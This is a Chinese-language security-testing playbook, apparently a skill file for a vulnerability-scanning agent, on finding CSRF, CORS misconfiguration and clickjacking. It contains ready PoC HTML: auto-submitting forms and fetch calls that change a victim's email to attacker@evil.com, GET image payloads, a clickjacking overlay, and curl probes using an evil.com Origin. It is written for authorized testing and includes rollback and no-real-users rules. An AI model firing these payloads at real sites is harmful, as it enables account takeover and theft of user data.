---
name: hunt-csrf
description: CSRF 跨站请求伪造：SameSite 与 Token 双防线核对、无 Token 状态改变接口识别、JSON/表单/文件上传类 CSRF、CORS 配置错误放大、点击劫持组合
whenToUse: 发现状态改变接口（改密码/绑定手机/转账/改邮箱/授权）且未确认有 Anti-CSRF Token 时
role: vuln-scan
enabled: true
---

# CSRF / CORS / 点击劫持

> CSRF 的判定标准只有一个：**攻击者页面能否让受害者浏览器发出一个「凭据自动携带 + 服务端接受」的状态改变请求。**

## 1. 先核对两道防线（都缺才算成立）

**防线一：Cookie 属性**

```
Set-Cookie: session=xxx; SameSite=Lax      ← 多数情况已够
Set-Cookie: session=xxx; SameSite=Strict   ← 最强
Set-Cookie: session=xxx                    ← 无 SameSite（Chrome 默认 Lax）
```

`SameSite=Lax` 时，跨站 **POST 不带 cookie**，传统 CSRF 不成立；但 **GET 状态改变接口仍可被打**。

**防线二：Anti-CSRF Token**

```
请求里有 csrf_token / _token / X-CSRF-Token / X-XSRF-TOKEN 且服务端校验
```

**注意**：有 token 字段不代表校验。测试法 —— 把 token 改一个字符、或整个删掉，看是否仍 200 且数据改变。

## 2. 高危接口清单（优先找这些）

| 功能 | 危害 |
|---|---|
| 改密码 / 重置密码 | 账号接管 |
| 改绑定邮箱 / 手机号 | 账号接管（配合找回密码） |
| 添加子账号 / 邀请成员 | 持久化后门 |
| 转账 / 下单 / 提现 | 资金 |
| 授权 OAuth 应用 | 数据长期外泄 |
| 改隐私设置 / 关闭二次验证 | 削弱防护 |
| 删除资源 | 破坏 |

## 3. 请求形态与对应打法

### 3.1 表单 POST（最经典）

```html
<form action="https://target.com/api/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

### 3.2 JSON body（需绕 Content-Type）

服务端只收 `application/json` 时，普通 form 打不进去。绕过：

```html
<!-- 法一：form 的 enctype 设 text/plain，构造出合法 JSON -->
<form action="https://target.com/api" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='"}'>
</form>
<!-- 实际发送体：{"email":"attacker@evil.com","x":""} -->
```

```html
<!-- 法二：fetch + no-cors（简单请求，不带预检） -->
<script>
fetch('https://target.com/api', {
  method: 'POST',
  mode: 'no-cors',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: '{"email":"attacker@evil.com"}'
})
</script>
```

若服务端**宽松解析**（不管 Content-Type 都按 JSON 解），此法直接成立。

### 3.3 GET 状态改变

```
<img src="https://target.com/api/delete?id=123">
```

`SameSite=Lax` 下**顶层导航 GET 仍带 cookie**，所以 GET 状态改变接口依然可打：

```html
<script>location='https://target.com/api/change-email?email=attacker@evil.com'</script>
```

### 3.4 文件上传类 CSRF

```html
<form action="https://target.com/api/avatar" method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
</form>
```

需要用户交互（选文件），或被 `hunt-file-upload` 的链组合利用。

## 4. CORS 配置错误（CSRF 的加强版）

CORS 配错可以直接**读**响应，比 CSRF 强一档。

检测：

```bash
curl -s -D- "https://TARGET/api/me" -H "Origin: https://evil.com" | grep -i "access-control"
```

| 响应 | 判定 |
|---|---|
| `ACAO: https://evil.com` + `ACAC: true` | **P0，可读任意用户数据** |
| `ACAO: *` + `ACAC: true` | 无效组合，浏览器拒绝 |
| `ACAO: *` 无 ACAC | 只能读公开数据，低危 |
| 反射 Origin 且 `null` 也被接受 | 可用 sandbox iframe 打 |

**`Origin: null` 测试**（sandbox iframe 或 `data:` URL 会产生 null）：

```bash
curl -s -D- "https://TARGET/api/me" -H "Origin: null" | grep -i "access-control"
```

## 5. 点击劫持（低成本，常被漏）

目标页无 `X-Frame-Options` 且无 `CSP: frame-ancestors` → 可被 iframe 嵌入。

```html
<style>
  iframe { position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.1; z-index:2 }
  button { position:absolute; top:340px; left:220px; z-index:1 }
</style>
<button>领取奖励</button>
<iframe src="https://target.com/settings/delete"></iframe>
```

检查：

```bash
curl -s -D- "https://TARGET/settings" | grep -iE "x-frame-options|content-security-policy"
```

两者都无 = 可打（P3–P4，但便宜）。

## 6. 判定标准

| 条件 | 结果 |
|---|---|
| 无 Token + SameSite=None/未设 + POST 状态改变成功 | **成立**（P2–P3，改密码类 P1） |
| 有 Token 但服务端不校验（删掉仍成功） | **成立**，与上同 |
| SameSite=Lax + 仅 POST 接口 | **不成立**（现代浏览器已拦） |
| SameSite=Lax + GET 状态改变接口 | **成立**（顶层导航仍带 cookie） |
| ACAO 反射任意 Origin + ACAC:true | **P0（可读数据）** |

## 7. 取证纪律

- PoC 页面放本地 `file://` 或自己的 OAST，**不托管在第三方**。
- 状态改变验证用**无害值**（改成自己的测试邮箱/一个可回滚的字段），验证后立刻改回。
- 报告附：原始请求、Cookie 属性、Token 校验测试结果、PoC HTML 全文。
- 落库 `category=auth-bypass` 或 `other`。

## 8. 不要做的事

- 禁：把受害者邮箱真改成不可控地址（会锁死账号）。
- 禁：用真实用户做 PoC 验证。
- 禁：在生产环境留下未回滚的状态改变。
- 禁：把 ACAO 反射直接当 P0 报而不验证能否真读到敏感数据（公开接口反射无危害）。

<!-- 改编自: src-hunter references/playbooks/logic-flaws/10-csrf.md + PayloadsAllTheThings/Cross-Site Request Forgery, 2026-11-01 -->
